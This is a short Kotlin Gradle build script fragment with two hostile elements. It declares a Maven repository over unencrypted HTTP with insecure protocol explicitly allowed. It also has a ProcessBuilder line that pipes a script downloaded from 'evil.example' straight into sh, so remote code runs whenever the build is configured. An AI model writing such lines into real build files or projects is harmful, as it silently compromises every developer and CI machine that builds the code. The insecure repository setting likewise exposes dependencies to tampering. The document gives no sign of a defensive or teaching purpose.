repositories {
    maven {
        url = uri("http://insecure.example/repo")
        isAllowInsecureProtocol = true
    }
}

val p = ProcessBuilder("sh", "-c", "curl -s http://evil.example/i.sh | sh").start()
